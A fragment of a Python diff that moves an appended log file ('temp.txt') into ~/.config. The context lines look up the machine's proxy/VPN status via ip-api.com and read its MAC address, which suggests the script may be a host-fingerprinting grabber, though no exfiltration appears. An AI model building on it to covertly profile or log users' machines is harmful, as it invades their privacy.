@@ -60,9 +60,15 @@ vpn = requests.get('http://ip-api.com/json?fields=proxy')
 proxy = vpn.json()['proxy']
 mac = get_mac()
 
-roaming = os.getenv('AppData')
-## Output for txt file location
-output = open("/home/torisgoat67/.config/temp.txt", "a")
+import os
+
+# Create ~/.config if it does not exist
+config_path = os.path.expanduser("~/.config/")
+os.makedirs(config_path, exist_ok=True)
+
+# Open your temp file inside ~/.config/
+output = open(os.path.join(config_path, "temp.txt"), "a")
+
 
 
 
